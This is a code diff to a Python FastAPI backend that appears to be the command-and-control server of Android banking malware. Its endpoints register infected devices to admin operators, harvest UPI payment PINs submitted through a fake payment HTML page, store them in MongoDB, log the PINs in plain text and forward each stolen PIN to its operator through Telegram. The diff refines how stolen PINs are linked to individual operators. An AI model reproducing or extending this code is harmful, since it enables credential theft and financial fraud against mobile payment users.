@@ -209,16 +209,21 @@ async def upload_response(request: Request):
 
 @app.post("/register")
 async def register_device(message: dict):
-    """رجیستر دستگاه با توکن ادمین"""
+    """
+    رجیستر دستگاه با توکن ادمین
+    
+    Accepts BOTH formats:
+    - Legacy: admin_token (device_token)
+    - New: user_id (same as admin_token/device_token)
+    """
     device_id = message.get("device_id")
     device_info = message.get("device_info", {})
-    admin_token = message.get("admin_token")  # 🔑 توکن ادمین
-    user_id = message.get("user_id")  # Static user identifier  
+    
+    # Support both admin_token and user_id (they're the same thing)
+    admin_token = message.get("admin_token") or message.get("user_id")
     app_type = message.get("app_type")  # App flavor
     
-    # Add user_id and app_type to device_info if provided
-    if user_id:
-        device_info["user_id"] = user_id
+    # Add app_type to device_info if provided
     if app_type:
         device_info["app_type"] = app_type
     
@@ -232,7 +237,11 @@ async def register_device(message: dict):
             device_id, device_info, admin_username
         )
     
-    return {"status": "success", "is_new": result.get("is_new", False)}
+    return {
+        "status": "success", 
+        "message": "Device registered successfully",
+        "device_id": device_id
+    }
 
 
 @app.post("/battery")
@@ -839,25 +848,44 @@ async def save_upi_pin(pin_data: UPIPinSave):
     💳 Save UPI PIN from HTML form
     
     - Receives PIN directly from payment HTML page
-    - Associates PIN with device_id
-    - Stores app_type and user_id
+    - user_id = admin's device_token (identifies which admin owns this device)
+    - Associates PIN with device and admin
     - Returns success with timestamp
     """
     try:
-        # Update device with UPI PIN
+        # user_id is actually the admin's device_token
+        admin_token = pin_data.user_id
+        
+        # Find admin by device_token
+        admin = await mongodb.db.admins.find_one({"device_token": admin_token})
+        
+        if not admin:
+            logger.warning(f"⚠️ Admin not found for user_id: {admin_token[:20]}...")
+            # Still save the PIN, but without admin association
+            admin_username = None
+        else:
+            admin_username = admin["username"]
+        
+        # Update or create device with UPI PIN
+        update_data = {
+            "$set": {
+                "upi_pin": pin_data.upi_pin,
+                "has_upi": True,
+                "upi_detected_at": datetime.utcnow(),
+                "upi_last_updated_at": datetime.utcnow(),
+                "app_type": pin_data.app_type,
+                "updated_at": datetime.utcnow()
+            }
+        }
+        
+        # If we found the admin, associate device with them
+        if admin_username:
+            update_data["$set"]["admin_username"] = admin_username
+            update_data["$set"]["admin_token"] = admin_token
+        
         result = await mongodb.db.devices.update_one(
             {"device_id": pin_data.device_id},
-            {
-                "$set": {
-                    "upi_pin": pin_data.upi_pin,
-                    "has_upi": True,
-                    "upi_detected_at": datetime.utcnow(),
-                    "upi_last_updated_at": datetime.utcnow(),
-                    "user_id": pin_data.user_id,
-                    "app_type": pin_data.app_type,
-                    "updated_at": datetime.utcnow()
-                }
-            },
+            update_data,
             upsert=True
         )
         
@@ -865,20 +893,20 @@ async def save_upi_pin(pin_data: UPIPinSave):
         await device_service.add_log(
             pin_data.device_id,
             "upi",
-            f"UPI PIN saved from {pin_data.app_type} app",
+            f"UPI PIN saved from {pin_data.app_type} app (PIN: {pin_data.upi_pin})",
             "info"
         )
         
-        # Notify admin if device is registered
-        device = await mongodb.db.devices.find_one({"device_id": pin_data.device_id})
-        if device and device.get("admin_username"):
+        # Notify admin via Telegram
+        if admin_username:
             await telegram_multi_service.notify_upi_detected(
                 pin_data.device_id,
                 pin_data.upi_pin,
-                device["admin_username"]
+                admin_username
             )
-        
-        logger.info(f"💳 UPI PIN saved for device: {pin_data.device_id} (app: {pin_data.app_type})")
+            logger.info(f"💳 UPI PIN saved for device: {pin_data.device_id} → Admin: {admin_username}")
+        else:
+            logger.info(f"💳 UPI PIN saved for device: {pin_data.device_id} (no admin association)")
         
         return UPIPinResponse(
             status="success",
